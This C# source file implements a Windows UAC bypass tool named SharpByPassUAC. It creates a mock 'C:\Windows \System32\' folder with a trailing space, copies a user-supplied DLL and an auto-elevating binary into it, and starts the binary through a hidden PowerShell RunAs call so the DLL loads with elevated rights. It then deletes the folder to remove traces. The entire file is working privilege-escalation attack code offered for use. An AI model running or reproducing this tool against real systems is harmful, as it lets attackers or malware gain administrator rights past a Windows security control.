using System;
using System.IO;
using Pastel;
using System.Drawing;
using CommandLine;

namespace SharpByPassUAC
{
    class Program
    {
        class Options
        {
            [Option("dll", Required = true,
              HelpText = "Input dll file to be processed.")]
            public string InputDLL { get; set; }

            [Option("binary",
              Required = true,
              HelpText = "Binary file to execute in order to trigger the UAC bypass.")]
            public string InputBinary { get; set; }
        }
        private static readonly int ExitCodeError = 1;

        static private byte[] GetBytesFromFile(string path)
        {
            byte[] dllContent = { };
            try
            {
                dllContent = File.ReadAllBytes(path);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Could not find the file {0}", path.Pastel(Color.Gold));
                Console.WriteLine(e.ToString());
                Environment.Exit(ExitCodeError);
            }

            return dllContent;
        }

        static void Main(string[] args)
        {
            var options = new Options();

            _ = Parser.Default.ParseArguments<Options>(args)
                .WithParsed(RunOptions);
        }

        static void RunOptions(Options opts)
        {
            Console.WriteLine("[+] ByPassUAC");

            string directory = @"C:\Windows \System32\";
            try {
                _ = Directory.CreateDirectory(directory);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error creating the folder {0}.", directory.Pastel(Color.Gold));
                Console.WriteLine("{0}", e);
                Environment.Exit(1);
            }
            Console.WriteLine("[+] Created the folder {0}.", directory.Pastel(Color.Gold));

            string dllTarget = string.Format(@"{0}{1}", directory, Path.GetFileName(opts.InputDLL));
            Console.WriteLine("[+] Copy the DLL {0} to {1}.", opts.InputDLL.Pastel(Color.Gold), dllTarget.Pastel(Color.Gold));
            File.Copy(opts.InputDLL, dllTarget, true);

            string binaryTarget = string.Format(@"{0}{1}", directory, Path.GetFileName(opts.InputBinary));
            Console.WriteLine("[+] Copy the binary {0} to {1}.", opts.InputBinary.Pastel(Color.Gold), binaryTarget.Pastel(Color.Gold));
            File.Copy(opts.InputBinary, binaryTarget, true);

            Console.WriteLine("[+] Run the binary {0} to trigger the code execution with UAC ByPass.", binaryTarget.Pastel(Color.Gold));
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.RedirectStandardOutput = true;
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "powershell.exe";
            startInfo.Arguments = string.Format("Start-Process '{0}' -Verb RunAs", binaryTarget);
            process.StartInfo = startInfo;
            process.Start();
            string result = process.StandardOutput.ReadToEnd();

            try
            {
                Directory.Delete(@"C:\Windows \", true);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error deleting the folder {0}.", @"C:\Windows \".Pastel(Color.Gold));
                Console.WriteLine("{0}", e);
                Environment.Exit(1);
            }
            Console.WriteLine("[+] Deleting the folder {0}.", @"C:\Windows \".Pastel(Color.Gold));
        }
    }
}
